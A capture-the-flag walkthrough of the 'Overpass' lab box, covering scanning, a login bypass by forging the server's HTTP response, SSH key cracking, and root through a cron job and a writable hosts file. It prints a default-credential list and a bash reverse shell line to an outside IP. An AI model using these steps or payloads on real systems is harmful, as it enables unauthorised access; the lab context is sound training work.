What happens when a group of broke Computer Science students try to make a password manager?  
Obviously a _perfect_ commercial success! I mean right... right?

### Recon
We can start by performing an aggressive scan on our target using nmap, the purpose of this aggressive scan is to find open ports, server operating system, service versions and traceroute results.
![image](https://github.com/kiiru4reals/writeups/blob/main/overpass/screenshots/nmap_scan.png?raw=true)
From the above scan we gather that the target has port 22 open which is SSH and port 80 which means that there is a website running on the server. When we visit the IP address on the server, we get to see the following landing page
![image](https://github.com/kiiru4reals/writeups/blob/main/overpass/screenshots/overpass_web.png?raw=true)
We can also see that we have an About us and Downloads page. We can proceed to looking for other directories in the next step which is the enumeration stage.

### Enumeration
We can fire up dirb to fuzz the target website so as to search for hidden directories which can be used in gaining access to this webpage.
![image](https://github.com/kiiru4reals/writeups/blob/main/overpass/screenshots/dirb_fuzz.png?raw=true)
From the search done so far, we can gather that we have an admin section on the website, when we navigate to that site we get the following login page.
![image](https://github.com/kiiru4reals/writeups/blob/main/overpass/screenshots/admin_login_page.png?raw=true)

### Gaining initial access
We can try and gain access using default credentials, for this we can enter the credentials manually, examples we can use include
```txt
admin:admin
admin:password
root:root
root:toor
root:password
```
We can see that none of those combinations work on the login page, I tried SQL injection on the login form but it did not work, we can inspecting the sites page and look at the function responsible for logging us in.
![image](https://github.com/kiiru4reals/writeups/blob/main/overpass/screenshots/login_flaw.png?raw=true)
when we look at the if statement on line 36, it tells us that tid the cookie is incorrect credentials, it is not supposed to authenticate us otherwise if the cookie is anything else apart from incorrect credentials it should log us in, using this discovery we can try to login to our page without valid credentials, to perform this daring act, we shall use burpsuite to intercept the traffic being sent to the server from the laptop so as to alter the response that we get.
![image](https://github.com/kiiru4reals/writeups/blob/main/overpass/screenshots/intercept_login_traffic.png?raw=true)
We can then proceed to intercept the response from the above request, we get the following response 
![image](https://github.com/kiiru4reals/writeups/blob/main/overpass/screenshots/intercepted_response.png?raw=true)
We can then change this response to 
```json
HTTP/1.1 302 FOUND  
Date: Mon, 20 Jul 2020 14:33:13 GMT  
Content-Length: 21  
Content-Type: text/plain; charset=utf-8  
Connection: close  
location: /admin
```
forward the response and then refresh the browser we get the following result
![image](https://github.com/kiiru4reals/writeups/blob/main/overpass/screenshots/logged_in.png?raw=true)
Voila! we are logged in on this page we get a message to James who forgets his password and an encrypted version of his SSH private key has been uploaded for him by Paradox.
We can save this hash to our attack machine and create a hash using ssh2john 

![image](https://github.com/kiiru4reals/writeups/blob/main/overpass/screenshots/hashed_key.png?raw=true)

We can then proceed to saving this hash so that we can crack it using JohnTheRipper 

![image](https://github.com/kiiru4reals/writeups/blob/main/overpass/screenshots/hash_cracking.png?raw=true)

Voila we were able to crack James' password, we can now login as james using SSH and extract our flag.
![image](https://github.com/kiiru4reals/writeups/blob/main/overpass/screenshots/initial_access.png?raw=true)
We can now collect our user flag before we can continue with privilege escalation
### Privilege escalation
Upon futher enumeration, we were able to discover that there is a cron job that runs a bash script after sending a curl request to `overpass.thm`, looking further we can see that the directory `/etc/hosts` is writable meaning that we can exploit this to get super user privileges.
We can then proceed to creating a script that allows us to connect to our target server 
```sh
#!/bin/bash
bash -i >& /dev/tcp/10.8.16.98/443 0>&1
```
We can then start a python server on our machine which will serve the above script to our target. 
We can then go to our attack machine and edit our `/etc/hosts` to make `overpass.thm` point to our attack machine.
We can then start our netcat listener to listen to connections. This is then a waiting game as we wait for the cron job to run our reverse shell.
![image](https://github.com/kiiru4reals/writeups/blob/main/overpass/screenshots/root_privileges.png?raw=true)
We are able to get a reverse shell as a root user, at this point we can collect the root flag and finish the box.

### Conclusion
Through a flawed login function, we were able to login to the overpass web application and get the James' SSH key, to prevent this case the developers of Overpass should analyze their code to find such flaws using open source security tools like Snyk Code. To read more about secure coding practices you can check out my post [here](https://kiiru4reals.wixsite.com/kiirudoescyber/post/writing-secure-code) 